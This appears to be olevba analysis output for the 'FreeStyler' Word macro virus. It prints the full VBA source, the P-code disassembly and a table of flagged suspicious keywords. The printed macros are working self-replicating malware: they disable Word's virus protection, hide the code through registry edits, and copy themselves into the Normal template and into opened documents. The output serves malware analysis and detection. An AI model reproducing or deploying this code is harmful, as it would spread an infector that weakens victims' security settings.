olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Free
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO FreeStyler.cls 
in file: ./Virus.MSWord.Free - OLE stream: 'Macros/VBA/FreeStyler'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next: If ActiveDocument.Name = ActiveDocument.FullName Then Document_New: End
If ActiveDocument.Saved = True Then Call Document_Open Else End
End Sub
Private Sub Document_Open()
On Error Resume Next: Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1": Set WshShell = CreateObject("WScript.Shell"): WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\EndProcLine", 0, "REG_DWORD"
ActiveDocument.ReadOnlyRecommended = 0: Application.ScreenUpdating = 0: Document_New
If ActiveDocument.ReadOnly = 1 Then: SetAttr ActiveDocument.FullName, 0: ActiveDocument.Reload
If NormalTemplate.VBProject.VBComponents.Item(1).Name = "FreeStyler" Then DOT = True
If ActiveDocument.VBProject.VBComponents.Item(1).Name = "FreeStyler" Then DOC = True
If DOT = True And DOC = True Then GoTo 1
If DOT = False Then VV = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, FreeStyler.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString VV: End With: NormalTemplate.VBProject.VBComponents.Item(1).Name = "FreeStyler"
If DOC = False Then CC = FreeStyler.VBProject.VBComponents.Item(1).CodeModule.Lines(1, FreeStyler.VBProject.VBComponents.Item(1).CodeModule.CountOfLines): With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, .CountOfLines: .AddFromString CC: End With: ActiveDocument.VBProject.VBComponents.Item(1).Name = "FreeStyler": Document_New
If ActiveDocument.FullName = wdOpenFormatDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
1: ActiveDocument.Saved = True
'VOVAN//SMF
End Sub
Private Sub Document_New()
On Error Resume Next
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
B = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1): C = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: xxx = Mid(B, 13): fff = Len(xxx) - 2: hhh = Left(xxx, fff): Number = MacroContainer.VBProject.VBComponents(1).CodeModule.ProcCountLines(hhh, vbext_pk_Proc): VV = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Number): With MacroContainer.VBProject.VBComponents.Item(1).CodeModule: .DeleteLines 1, Number: .InsertLines C, VV: End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Free
' ===============================================================================
' Module streams:
' Macros/VBA/FreeStyler - 4080 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Document_New 0x0000 
' 	BoS 0x0000 
' 	End 
' 	EndIf 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Document_Open 0x0000 
' 	Else 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' Line #5:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	LitStr 0x001F "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeBackColors"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeForeColors"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' 	BoS 0x0000 
' 	LitStr 0x003B "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\EndProcLine"
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0003 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' 	BoS 0x0000 
' 	ArgsCall Document_New 0x0000 
' Line #8:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' 	EndIf 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "FreeStyler"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DOT 
' 	EndIf 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "FreeStyler"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DOC 
' 	EndIf 
' Line #11:
' 	Ld DOT 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DOC 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #12:
' 	Ld DOT 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld FreeStyler 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld VV 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	LitStr 0x000A "FreeStyler"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' 	EndIf 
' Line #13:
' 	Ld DOC 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld FreeStyler 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld FreeStyler 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St CC 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld CC 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	LitStr 0x000A "FreeStyler"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' 	BoS 0x0000 
' 	ArgsCall Document_New 0x0000 
' 	EndIf 
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld wdOpenFormatDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #15:
' 	LineNum 1 
' 	BoS 0x0003 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #16:
' 	QuoteRem 0x0000 0x000A "VOVAN//SMF"
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub Document_New())
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St B 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St C 
' 	BoS 0x0000 
' 	Ld B 
' 	LitDI2 0x000D 
' 	ArgsLd Mid$ 0x0002 
' 	St xxx 
' 	BoS 0x0000 
' 	Ld xxx 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	St fff 
' 	BoS 0x0000 
' 	Ld xxx 
' 	Ld fff 
' 	ArgsLd LBound 0x0002 
' 	St hhh 
' 	BoS 0x0000 
' 	Ld hhh 
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Number 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' 	BoS 0x0000 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Number 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld C 
' 	Ld VV 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' Line #22:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

